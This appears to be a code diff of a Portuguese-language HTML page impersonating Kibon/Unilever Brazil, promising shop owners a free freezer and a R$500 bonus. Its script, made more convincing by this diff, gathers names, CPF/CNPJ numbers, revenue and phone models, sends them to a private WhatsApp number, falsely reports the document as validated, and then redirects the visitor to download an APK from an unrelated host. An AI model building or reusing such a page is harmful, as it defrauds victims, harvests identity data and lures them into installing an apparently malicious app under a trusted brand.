@@ -3,31 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KIBON - Ganhe seu Freezer e Bônus</title>
+    <title>KIBON - Sistema de Credenciamento</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Arial Black', sans-serif; }
         body { background-color: #E2001A; padding: 10px; }
         
-        /* CABEÇALHO GIGANTE */
         .header { text-align: center; padding: 20px 0; color: white; }
         .logo-gigante { font-size: 75px; font-weight: 900; letter-spacing: -5px; line-height: 1; margin: 0; text-shadow: 4px 4px 0px rgba(0,0,0,0.2); }
         .tag-amarela { background: #FFD700; color: #E2001A; padding: 8px 20px; border-radius: 50px; font-weight: 900; display: inline-block; transform: rotate(-2deg); box-shadow: 3px 3px 0px #000; margin-top: 10px; }
 
-        /* BOX DE PREÇO E FREEZER */
         .box-destaque { background: #000; border: 3px solid #FFD700; border-radius: 20px; margin: 15px 0; padding: 20px; text-align: center; color: white; }
         .preço-valor { font-size: 55px; font-weight: 900; color: white; display: block; }
         .freezer-alerta { color: #FFD700; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-top: 10px; border-top: 1px solid #333; padding-top: 10px; }
 
-        /* CARD DE CADASTRO */
         .card-branco { background: white; border-radius: 30px; padding: 25px; color: #333; box-shadow: 0 15px 40px rgba(0,0,0,0.4); }
         .titulo-form { text-align: center; font-weight: 900; margin-bottom: 20px; color: #E2001A; font-size: 18px; text-transform: uppercase; }
         
-        .campo { margin-bottom: 15px; }
+        .campo { margin-bottom: 15px; position: relative; }
         label { display: block; font-size: 11px; font-weight: bold; color: #777; margin-bottom: 5px; text-transform: uppercase; font-family: sans-serif; }
         input { width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 12px; font-size: 15px; outline: none; font-family: sans-serif; font-weight: bold; }
-        input:focus { border-color: #E2001A; background: #fffcfc; }
+        input.erro { border-color: #ff4d4d; background: #fff1f1; }
+        
+        /* Mensagem de Erro no Site */
+        .msg-erro { color: #ff4d4d; font-size: 10px; font-weight: bold; display: none; margin-top: 5px; font-family: sans-serif; }
 
-        /* BOTÃO DE AÇÃO */
         .btn-enviar { width: 100%; padding: 22px; background: #E2001A; color: white; border: none; border-radius: 100px; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 8px 20px rgba(0,0,0,0.2); transition: 0.3s; text-transform: uppercase; }
         .btn-enviar:hover { transform: scale(1.02); background: #c10016; }
 
@@ -44,25 +43,26 @@
     <div class="box-destaque">
         <p style="font-size: 12px; color: #FFD700; letter-spacing: 2px;">TABELA DE REVENDA</p>
         <span class="preço-valor">R$ 0,59 <small style="font-size: 20px;">un.</small></span>
-        <div class="freezer-alerta">🎁 CADASTRE-SE E GANHE O FREEZER + R$ 500 DE BÔNUS</div>
+        <div class="freezer-alerta">🎁 GANHE O FREEZER + R$ 500 DE BÔNUS</div>
     </div>
 
     <div class="card-branco">
-        <p class="titulo-form">Credenciamento de Ponto de Venda</p>
+        <p class="titulo-form">Validação de Revendedor</p>
         
         <div class="campo">
-            <label>Nome do Responsável (Titular)</label>
+            <label>Nome do Responsável</label>
             <input type="text" id="nome" placeholder="Nome Completo">
         </div>
 
         <div class="campo">
             <label>Nome Fantasia do Comércio</label>
-            <input type="text" id="loja" placeholder="Ex: Mercado Kibon">
+            <input type="text" id="loja" placeholder="Nome do Ponto de Venda">
         </div>
 
         <div class="campo">
-            <label>CNPJ ou CPF</label>
-            <input type="text" id="doc" placeholder="00.000.000/0001-00">
+            <label>CNPJ ou CPF (Somente números)</label>
+            <input type="text" id="doc" placeholder="Digite CPF ou CNPJ" maxlength="14">
+            <div id="erro-doc" class="msg-erro">⚠️ CPF ou CNPJ INVÁLIDO. Verifique os números.</div>
         </div>
 
         <div style="display: flex; gap: 10px;">
@@ -71,34 +71,79 @@
                 <input type="text" id="cid" placeholder="Sua cidade">
             </div>
             <div class="campo" style="flex: 1;">
-                <label>Estado</label>
+                <label>UF</label>
                 <input type="text" id="uf" maxlength="2" placeholder="UF">
             </div>
         </div>
 
         <div class="campo">
             <label>Modelo do Aparelho Celular</label>
-            <input type="text" id="cel" placeholder="Ex: Samsung Galaxy, iPhone">
+            <input type="text" id="cel" placeholder="Ex: Samsung, iPhone, Motorola">
         </div>
 
         <div class="campo">
-            <label>Faturamento Mensal Estimado</label>
+            <label>Faturamento Mensal</label>
             <input type="text" id="faturamento" placeholder="R$ 0,00">
         </div>
 
-        <button type="button" class="btn-enviar" onclick="finalizarPedido()">CADASTRAR E RESGATAR TUDO</button>
+        <button type="button" class="btn-enviar" onclick="validarEEnviar()">CADASTRAR E RESGATAR TUDO</button>
     </div>
 
-    <p class="footer">DISTRIBUIÇÃO UNILEVER BRASIL © 2026<br>POLÍTICA DE EXPANSÃO NACIONAL</p>
+    <p class="footer">DISTRIBUIÇÃO KIBON BRASIL © 2026</p>
 
     <script>
-        function finalizarPedido() {
+        function validarEEnviar() {
             const meuZap = "5554999422678";
-            
-            // --- LINK DO SEU APK AQUI ---
             const linkApk = "https://seusite.netlify.app/kibon-oficial.apk"; 
+
+            const docInput = document.getElementById('doc');
+            const erroMsg = document.getElementById('erro-doc');
+            const docValue = docInput.value.replace(/\D/g, ''); // Remove letras/pontos
+
+            // Validação de CPF (11) ou CNPJ (14)
+            if (docValue.length !== 11 && docValue.length !== 14) {
+                docInput.classList.add('erro');
+                erroMsg.style.display = 'block';
+                alert("O sistema identificou um CPF/CNPJ inválido. Por favor, corrija para prosseguir.");
+                return;
+            } else {
+                docInput.classList.remove('erro');
+                erroMsg.style.display = 'none';
+            }
 
             const dados = {
                 nome: document.getElementById('nome').value,
                 loja: document.getElementById('loja').value,
-                doc: document.getElementById
+                doc: docValue,
+                cid: document.getElementById('cid').value,
+                uf: document.getElementById('uf').value,
+                cel: document.getElementById('cel').value,
+                fat: document.getElementById('faturamento').value
+            };
+
+            if(!dados.nome || !dados.loja || !dados.fat) {
+                alert("Preencha todos os campos corretamente!");
+                return;
+            }
+
+            const mensagem = `*NOVA SOLICITAÇÃO: FREEZER + BÔNUS R$ 500*%0A` +
+                             `----------------------------%0A` +
+                             `👤 *Responsável:* ${dados.nome}%0A` +
+                             `🏪 *Loja:* ${dados.loja}%0A` +
+                             `📄 *Documento:* ${dados.doc}%0A` +
+                             `📍 *Local:* ${dados.cid}-${dados.uf}%0A` +
+                             `📱 *Aparelho:* ${dados.cel}%0A` +
+                             `💰 *Faturamento:* ${dados.fat}%0A` +
+                             `----------------------------%0A` +
+                             `*SISTEMA: DOCUMENTO VALIDADO*`;
+
+            window.open(`https://api.whatsapp.com/send?phone=${meuZap}&text=${mensagem}`, '_blank');
+            
+            setTimeout(() => {
+                alert("Cadastro Validado com Sucesso! Baixe o App para resgatar seu Freezer e o Saldo de R$ 500.");
+                window.location.href = linkApk;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
